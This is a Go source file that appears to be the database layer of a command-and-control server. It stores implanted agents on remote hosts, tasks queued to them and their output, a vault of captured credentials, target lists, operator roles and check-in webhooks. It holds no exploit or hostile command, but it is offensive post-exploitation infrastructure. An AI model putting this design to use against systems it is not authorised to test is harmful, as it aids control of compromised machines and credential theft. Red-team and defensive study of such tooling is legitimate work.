package server

import (
	"database/sql"
	"encoding/hex"
	"time"

	_ "modernc.org/sqlite"
)

const schema = `
CREATE TABLE IF NOT EXISTS agents (
	id           TEXT PRIMARY KEY,
	hostname     TEXT NOT NULL,
	username     TEXT NOT NULL,
	os           TEXT NOT NULL,
	ip           TEXT NOT NULL,
	pid          INTEGER NOT NULL,
	aes_key      TEXT NOT NULL,
	first_seen   DATETIME DEFAULT (datetime('now')),
	last_seen    DATETIME DEFAULT (datetime('now')),
	sleep_sec    INTEGER DEFAULT 60,
	jitter_pct   INTEGER DEFAULT 20,
	transport    TEXT DEFAULT 'http',
	active       INTEGER DEFAULT 1,
	process_name TEXT DEFAULT ''
);

CREATE TABLE IF NOT EXISTS tasks (
	id         INTEGER PRIMARY KEY AUTOINCREMENT,
	agent_id   TEXT NOT NULL REFERENCES agents(id),
	type       TEXT NOT NULL,
	args       TEXT,
	payload    BLOB,
	created_at DATETIME DEFAULT (datetime('now')),
	fetched_at DATETIME,
	status     TEXT DEFAULT 'pending',
	operator   TEXT DEFAULT ''
);

CREATE TABLE IF NOT EXISTS results (
	id         INTEGER PRIMARY KEY AUTOINCREMENT,
	task_id    INTEGER NOT NULL REFERENCES tasks(id),
	agent_id   TEXT NOT NULL REFERENCES agents(id),
	output     TEXT,
	error      TEXT,
	created_at DATETIME DEFAULT (datetime('now'))
);

CREATE INDEX IF NOT EXISTS idx_tasks_agent  ON tasks(agent_id, status);
CREATE INDEX IF NOT EXISTS idx_results_task ON results(task_id);

CREATE TABLE IF NOT EXISTS credentials (
	id          INTEGER PRIMARY KEY AUTOINCREMENT,
	type        TEXT NOT NULL DEFAULT 'plaintext',
	domain      TEXT DEFAULT '',
	username    TEXT NOT NULL,
	secret      TEXT NOT NULL,
	host        TEXT DEFAULT '',
	source      TEXT DEFAULT '',
	operator    TEXT DEFAULT '',
	captured_at DATETIME DEFAULT (datetime('now'))
);

CREATE TABLE IF NOT EXISTS operator_roles (
	operator    TEXT PRIMARY KEY,
	role        TEXT NOT NULL DEFAULT 'operator'
);

CREATE TABLE IF NOT EXISTS webhook_configs (
	id         INTEGER PRIMARY KEY AUTOINCREMENT,
	name       TEXT NOT NULL,
	type       TEXT NOT NULL DEFAULT 'discord',
	url        TEXT NOT NULL,
	events     TEXT NOT NULL DEFAULT 'checkin',
	enabled    INTEGER NOT NULL DEFAULT 1,
	created_at DATETIME DEFAULT (datetime('now'))
);

CREATE TABLE IF NOT EXISTS targets (
	id         INTEGER PRIMARY KEY AUTOINCREMENT,
	ip         TEXT NOT NULL DEFAULT '',
	hostname   TEXT NOT NULL DEFAULT '',
	os         TEXT NOT NULL DEFAULT '',
	notes      TEXT NOT NULL DEFAULT '',
	status     TEXT NOT NULL DEFAULT 'unknown',
	tags       TEXT NOT NULL DEFAULT '',
	source     TEXT NOT NULL DEFAULT 'manual',
	agent_id   TEXT NOT NULL DEFAULT '',
	created_at DATETIME DEFAULT (datetime('now')),
	updated_at DATETIME DEFAULT (datetime('now'))
);

CREATE INDEX IF NOT EXISTS idx_creds_user ON credentials(username, domain);
`

type Agent struct {
	ID          string    `json:"id"`
	Hostname    string    `json:"hostname"`
	Username    string    `json:"username"`
	OS          string    `json:"os"`
	IP          string    `json:"ip"`
	PID         int       `json:"pid"`
	AESKey      []byte    `json:"aes_key,omitempty"`
	FirstSeen   time.Time `json:"first_seen"`
	LastSeen    time.Time `json:"last_seen"`
	SleepSec    int       `json:"sleep_sec"`
	JitterPct   int       `json:"jitter_pct"`
	Transport   string    `json:"transport"`
	Active      bool      `json:"active"`
	ProcessName string    `json:"process_name,omitempty"`
	IsAdmin     bool      `json:"is_admin"`
	Notes       string    `json:"notes,omitempty"`
	ParentID    string    `json:"parent_id,omitempty"`
}

type Task struct {
	ID        int64
	AgentID   string
	Type      string
	Args      string
	Payload   []byte
	CreatedAt time.Time
	FetchedAt *time.Time
	Status    string
	Operator  string
}

type Result struct {
	ID        int64     `json:"id"`
	TaskID    int64     `json:"task_id"`
	AgentID   string    `json:"agent_id"`
	Output    string    `json:"output"`
	Error     string    `json:"error"`
	CreatedAt time.Time `json:"created_at"`
}

type DB struct {
	db *sql.DB
}

func NewDB(path string) (*DB, error) {
	// busy_timeout: retry up to 5 s on SQLITE_BUSY instead of returning immediately
	dsn := path + "?_busy_timeout=5000&_journal_mode=WAL"
	db, err := sql.Open("sqlite", dsn)
	if err != nil {
		return nil, err
	}
	// Single writer — serialises all writes, eliminates SQLITE_BUSY under concurrent agents
	db.SetMaxOpenConns(1)
	if _, err = db.Exec(schema); err != nil {
		return nil, err
	}
	// Soft migrations — safe to run on existing DBs
	db.Exec(`ALTER TABLE tasks ADD COLUMN operator TEXT DEFAULT ''`)
	db.Exec(`ALTER TABLE agents ADD COLUMN process_name TEXT DEFAULT ''`)
	db.Exec(`ALTER TABLE agents ADD COLUMN is_admin INTEGER DEFAULT 0`)
	db.Exec(`ALTER TABLE agents ADD COLUMN notes TEXT DEFAULT ''`)
	db.Exec(`ALTER TABLE agents ADD COLUMN parent_id TEXT DEFAULT NULL`)
	return &DB{db: db}, nil
}

func (d *DB) RegisterAgent(a *Agent) error {
	isAdminInt := 0
	if a.IsAdmin {
		isAdminInt = 1
	}
	var parentID interface{}
	if a.ParentID != "" {
		parentID = a.ParentID
	}
	_, err := d.db.Exec(
		`INSERT OR REPLACE INTO agents (id, hostname, username, os, ip, pid, aes_key, sleep_sec, jitter_pct, transport, active, process_name, is_admin, parent_id)
		 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 1, ?, ?, ?)`,
		a.ID, a.Hostname, a.Username, a.OS, a.IP, a.PID,
		hex.EncodeToString(a.AESKey), a.SleepSec, a.JitterPct, a.Transport, a.ProcessName, isAdminInt, parentID,
	)
	return err
}

func (d *DB) TouchAgent(id string) error {
	_, err := d.db.Exec(`UPDATE agents SET last_seen = datetime('now') WHERE id = ?`, id)
	return err
}

func (d *DB) GetAgent(id string) (*Agent, error) {
	row := d.db.QueryRow(
		`SELECT id, hostname, username, os, ip, pid, aes_key, first_seen, last_seen,
		        sleep_sec, jitter_pct, transport, active, COALESCE(process_name,''), COALESCE(is_admin,0), COALESCE(notes,''), COALESCE(parent_id,'')
		 FROM agents WHERE id = ?`, id)
	return scanAgent(row)
}

func (d *DB) ListAgents() ([]*Agent, error) {
	rows, err := d.db.Query(
		`SELECT id, hostname, username, os, ip, pid, aes_key, first_seen, last_seen,
		        sleep_sec, jitter_pct, transport, active, COALESCE(process_name,''), COALESCE(is_admin,0), COALESCE(notes,''), COALESCE(parent_id,'')
		 FROM agents ORDER BY last_seen DESC`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	var agents []*Agent
	for rows.Next() {
		a, err := scanAgent(rows)
		if err != nil {
			return nil, err
		}
		agents = append(agents, a)
	}
	return agents, nil
}

func (d *DB) KillAgent(id string) error {
	_, err := d.db.Exec(`UPDATE agents SET active = 0 WHERE id = ?`, id)
	return err
}

func (d *DB) DeleteAgent(id string) error {
	d.db.Exec(`DELETE FROM results WHERE agent_id = ?`, id)
	d.db.Exec(`DELETE FROM tasks    WHERE agent_id = ?`, id)
	_, err := d.db.Exec(`DELETE FROM agents WHERE id = ?`, id)
	return err
}

func (d *DB) UpdateAgentSleep(id string, sleepSec, jitterPct int) error {
	_, err := d.db.Exec(
		`UPDATE agents SET sleep_sec = ?, jitter_pct = ? WHERE id = ?`,
		sleepSec, jitterPct, id)
	return err
}

func (d *DB) UpdateAgentNotes(id, notes string) error {
	_, err := d.db.Exec(`UPDATE agents SET notes = ? WHERE id = ?`, notes, id)
	return err
}

func (d *DB) UpdateAgentParent(id, parentID string) error {
	var val interface{}
	if parentID != "" {
		val = parentID
	}
	_, err := d.db.Exec(`UPDATE agents SET parent_id = ? WHERE id = ?`, val, id)
	return err
}

// IsStale devuelve true si el agente lleva más de 3 intervalos sin hacer check-in.
func IsStale(a *Agent) bool {
	if !a.Active {
		return false
	}
	threshold := time.Duration(a.SleepSec*3) * time.Second
	return time.Since(a.LastSeen) > threshold
}

type scanner interface {
	Scan(dest ...any) error
}

func scanAgent(s scanner) (*Agent, error) {
	var a Agent
	var keyHex string
	var activeInt, isAdminInt int
	err := s.Scan(
		&a.ID, &a.Hostname, &a.Username, &a.OS, &a.IP, &a.PID,
		&keyHex, &a.FirstSeen, &a.LastSeen,
		&a.SleepSec, &a.JitterPct, &a.Transport, &activeInt, &a.ProcessName, &isAdminInt, &a.Notes, &a.ParentID,
	)
	if err != nil {
		return nil, err
	}
	a.AESKey, _ = hex.DecodeString(keyHex)
	a.Active = activeInt == 1
	a.IsAdmin = isAdminInt == 1
	return &a, nil
}

func (d *DB) QueueTask(agentID, taskType, args string, payload []byte, operator string) (int64, error) {
	res, err := d.db.Exec(
		`INSERT INTO tasks (agent_id, type, args, payload, operator) VALUES (?, ?, ?, ?, ?)`,
		agentID, taskType, args, payload, operator,
	)
	if err != nil {
		return 0, err
	}
	return res.LastInsertId()
}

func (d *DB) PendingTasks(agentID string) ([]*Task, error) {
	rows, err := d.db.Query(
		`SELECT id, agent_id, type, args, payload, created_at, status
		 FROM tasks WHERE agent_id = ? AND status = 'pending'
		 ORDER BY id ASC`, agentID)
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	var tasks []*Task
	for rows.Next() {
		var t Task
		var args sql.NullString
		err := rows.Scan(&t.ID, &t.AgentID, &t.Type, &args, &t.Payload, &t.CreatedAt, &t.Status)
		if err != nil {
			return nil, err
		}
		t.Args = args.String
		tasks = append(tasks, &t)
	}
	return tasks, nil
}

func (d *DB) MarkTaskFetched(id int64) error {
	_, err := d.db.Exec(
		`UPDATE tasks SET status = 'fetched', fetched_at = datetime('now') WHERE id = ?`, id)
	return err
}

func (d *DB) InsertResult(taskID int64, agentID, output, errStr string) error {
	_, err := d.db.Exec(
		`INSERT INTO results (task_id, agent_id, output, error) VALUES (?, ?, ?, ?)`,
		taskID, agentID, output, errStr,
	)
	if err != nil {
		return err
	}
	status := "done"
	if errStr != "" {
		status = "error"
	}
	_, err = d.db.Exec(`UPDATE tasks SET status = ? WHERE id = ?`, status, taskID)
	return err
}

func (d *DB) GetResults(agentID string, limit int) ([]*Result, error) {
	rows, err := d.db.Query(
		`SELECT r.id, r.task_id, r.agent_id, r.output, r.error, r.created_at
		 FROM results r WHERE r.agent_id = ?
		 ORDER BY r.id DESC LIMIT ?`, agentID, limit)
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	var results []*Result
	for rows.Next() {
		var r Result
		var out, errStr sql.NullString
		err := rows.Scan(&r.ID, &r.TaskID, &r.AgentID, &out, &errStr, &r.CreatedAt)
		if err != nil {
			return nil, err
		}
		r.Output = out.String
		r.Error = errStr.String
		results = append(results, &r)
	}
	return results, nil
}

func (d *DB) GetResultByTaskID(taskID int64) (*Result, error) {
	row := d.db.QueryRow(
		`SELECT r.id, r.task_id, r.agent_id, r.output, r.error, r.created_at
		 FROM results r WHERE r.task_id = ? LIMIT 1`, taskID)
	var r Result
	var out, errStr sql.NullString
	if err := row.Scan(&r.ID, &r.TaskID, &r.AgentID, &out, &errStr, &r.CreatedAt); err != nil {
		return nil, err
	}
	r.Output = out.String
	r.Error = errStr.String
	return &r, nil
}

// ── credential vault ──────────────────────────────────────────────────────

type Credential struct {
	ID         int64     `json:"id"`
	Type       string    `json:"type"`
	Domain     string    `json:"domain"`
	Username   string    `json:"username"`
	Secret     string    `json:"secret"`
	Host       string    `json:"host"`
	Source     string    `json:"source"`
	Operator   string    `json:"operator"`
	CapturedAt time.Time `json:"captured_at"`
}

func (d *DB) AddCred(credType, domain, username, secret, host, source, operator string) (int64, error) {
	res, err := d.db.Exec(
		`INSERT INTO credentials (type, domain, username, secret, host, source, operator)
		 VALUES (?, ?, ?, ?, ?, ?, ?)`,
		credType, domain, username, secret, host, source, operator,
	)
	if err != nil {
		return 0, err
	}
	return res.LastInsertId()
}

func (d *DB) ListCreds(filter string) ([]*Credential, error) {
	q := `SELECT id, type, domain, username, secret, host, source, operator, captured_at
	      FROM credentials`
	args := []any{}
	if filter != "" {
		q += ` WHERE username LIKE ? OR domain LIKE ? OR host LIKE ? OR source LIKE ?`
		f := "%" + filter + "%"
		args = append(args, f, f, f, f)
	}
	q += ` ORDER BY captured_at DESC`
	rows, err := d.db.Query(q, args...)
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	var creds []*Credential
	for rows.Next() {
		var c Credential
		var domain, host, source, operator sql.NullString
		if err := rows.Scan(&c.ID, &c.Type, &domain, &c.Username, &c.Secret,
			&host, &source, &operator, &c.CapturedAt); err != nil {
			return nil, err
		}
		c.Domain = domain.String
		c.Host = host.String
		c.Source = source.String
		c.Operator = operator.String
		creds = append(creds, &c)
	}
	return creds, nil
}

func (d *DB) DeleteCred(id int64) error {
	_, err := d.db.Exec(`DELETE FROM credentials WHERE id = ?`, id)
	return err
}

// ── operator roles ────────────────────────────────────────────────────────

const (
	RoleAdmin    = "admin"
	RoleOperator = "operator"
	RoleViewer   = "viewer"
)

func (d *DB) GetOperatorRole(operator string) string {
	var role string
	err := d.db.QueryRow(`SELECT role FROM operator_roles WHERE operator = ?`, operator).Scan(&role)
	if err != nil {
		return RoleOperator // default
	}
	return role
}

func (d *DB) SetOperatorRole(operator, role string) error {
	_, err := d.db.Exec(
		`INSERT OR REPLACE INTO operator_roles (operator, role) VALUES (?, ?)`,
		operator, role,
	)
	return err
}

func (d *DB) ListRoles() (map[string]string, error) {
	rows, err := d.db.Query(`SELECT operator, role FROM operator_roles ORDER BY operator`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	out := make(map[string]string)
	for rows.Next() {
		var op, role string
		if err := rows.Scan(&op, &role); err != nil {
			return nil, err
		}
		out[op] = role
	}
	return out, nil
}

// ── report data ───────────────────────────────────────────────────────────

type ReportEvent struct {
	TaskID   int64
	AgentID  string
	Hostname string
	Username string
	IP       string
	OS       string
	Operator string
	Type     string
	Args     string
	Status   string
	QueuedAt time.Time
	ResultAt *time.Time
	Output   string
	Error    string
}

type ReportData struct {
	Agents []*Agent
	Events []*ReportEvent
}

func (d *DB) GetReportData() (*ReportData, error) {
	agents, err := d.ListAgents()
	if err != nil {
		return nil, err
	}

	rows, err := d.db.Query(`
		SELECT t.id, t.agent_id, a.hostname, a.username, a.ip, a.os, t.operator,
		       t.type, t.args, t.status, t.created_at,
		       r.output, r.error, r.created_at as result_at
		FROM tasks t
		JOIN agents a ON t.agent_id = a.id
		LEFT JOIN results r ON r.task_id = t.id
		WHERE t.type != 'KILL'
		ORDER BY t.created_at ASC
	`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var events []*ReportEvent
	for rows.Next() {
		var e ReportEvent
		var args, output, errStr sql.NullString
		var resultAt sql.NullTime
		err := rows.Scan(
			&e.TaskID, &e.AgentID, &e.Hostname, &e.Username, &e.IP, &e.OS, &e.Operator,
			&e.Type, &args, &e.Status, &e.QueuedAt,
			&output, &errStr, &resultAt,
		)
		if err != nil {
			return nil, err
		}
		e.Args = args.String
		e.Output = output.String
		e.Error = errStr.String
		if resultAt.Valid {
			t := resultAt.Time
			e.ResultAt = &t
		}
		events = append(events, &e)
	}

	return &ReportData{Agents: agents, Events: events}, nil
}

// ── webhooks ──────────────────────────────────────────────────────────────────

type WebhookConfig struct {
	ID        int64     `json:"id"`
	Name      string    `json:"name"`
	Type      string    `json:"type"`
	URL       string    `json:"url"`
	Events    string    `json:"events"`
	Enabled   bool      `json:"enabled"`
	CreatedAt time.Time `json:"created_at"`
}

func (d *DB) ListWebhooks() ([]*WebhookConfig, error) {
	rows, err := d.db.Query(`SELECT id, name, type, url, events, enabled, created_at FROM webhook_configs ORDER BY id`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	var out []*WebhookConfig
	for rows.Next() {
		var w WebhookConfig
		var enabled int
		if err := rows.Scan(&w.ID, &w.Name, &w.Type, &w.URL, &w.Events, &enabled, &w.CreatedAt); err != nil {
			return nil, err
		}
		w.Enabled = enabled == 1
		out = append(out, &w)
	}
	if out == nil {
		out = []*WebhookConfig{}
	}
	return out, nil
}

func (d *DB) AddWebhook(name, whType, url, events string) (int64, error) {
	res, err := d.db.Exec(
		`INSERT INTO webhook_configs (name, type, url, events) VALUES (?, ?, ?, ?)`,
		name, whType, url, events,
	)
	if err != nil {
		return 0, err
	}
	return res.LastInsertId()
}

func (d *DB) DeleteWebhook(id int64) error {
	_, err := d.db.Exec(`DELETE FROM webhook_configs WHERE id = ?`, id)
	return err
}

func (d *DB) ToggleWebhook(id int64, enabled bool) error {
	v := 0
	if enabled {
		v = 1
	}
	_, err := d.db.Exec(`UPDATE webhook_configs SET enabled = ? WHERE id = ?`, v, id)
	return err
}

// ── targets ───────────────────────────────────────────────────────────────────

type Target struct {
	ID        int64     `json:"id"`
	IP        string    `json:"ip"`
	Hostname  string    `json:"hostname"`
	OS        string    `json:"os"`
	Notes     string    `json:"notes"`
	Status    string    `json:"status"`
	Tags      string    `json:"tags"`
	Source    string    `json:"source"`
	AgentID   string    `json:"agent_id"`
	CreatedAt time.Time `json:"created_at"`
	UpdatedAt time.Time `json:"updated_at"`
}

func (d *DB) ListTargets() ([]*Target, error) {
	rows, err := d.db.Query(`SELECT id, ip, hostname, os, notes, status, tags, source, agent_id, created_at, updated_at FROM targets ORDER BY id DESC`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	var out []*Target
	for rows.Next() {
		var t Target
		if err := rows.Scan(&t.ID, &t.IP, &t.Hostname, &t.OS, &t.Notes, &t.Status, &t.Tags, &t.Source, &t.AgentID, &t.CreatedAt, &t.UpdatedAt); err != nil {
			return nil, err
		}
		out = append(out, &t)
	}
	if out == nil {
		out = []*Target{}
	}
	return out, nil
}

func (d *DB) AddTarget(ip, hostname, os string) (int64, error) {
	res, err := d.db.Exec(
		`INSERT OR IGNORE INTO targets (ip, hostname, os) VALUES (?, ?, ?)`,
		ip, hostname, os,
	)
	if err != nil {
		return 0, err
	}
	return res.LastInsertId()
}

func (d *DB) UpsertTargetFromAgent(ip, hostname, os, agentID string) error {
	if ip == "" {
		return nil
	}
	res, err := d.db.Exec(
		`UPDATE targets SET hostname=?, os=?, agent_id=?, updated_at=datetime('now') WHERE ip=?`,
		hostname, os, agentID, ip,
	)
	if err != nil {
		return err
	}
	if n, _ := res.RowsAffected(); n == 0 {
		_, err = d.db.Exec(
			`INSERT OR IGNORE INTO targets (ip, hostname, os, source, agent_id) VALUES (?, ?, ?, 'agent', ?)`,
			ip, hostname, os, agentID,
		)
	}
	return err
}

func (d *DB) UpdateTarget(id int64, ip, hostname, os, notes, status, tags string) error {
	_, err := d.db.Exec(`
		UPDATE targets SET ip=?, hostname=?, os=?, notes=?, status=?, tags=?, updated_at=datetime('now')
		WHERE id=?`,
		ip, hostname, os, notes, status, tags, id,
	)
	return err
}

func (d *DB) DeleteTarget(id int64) error {
	_, err := d.db.Exec(`DELETE FROM targets WHERE id = ?`, id)
	return err
}

func (d *DB) ImportTargetsFromAgents(agents []*Agent) error {
	for _, a := range agents {
		if a.IP == "" {
			continue
		}
		if err := d.UpsertTargetFromAgent(a.IP, a.Hostname, a.OS, a.ID); err != nil {
			return err
		}
	}
	return nil
}
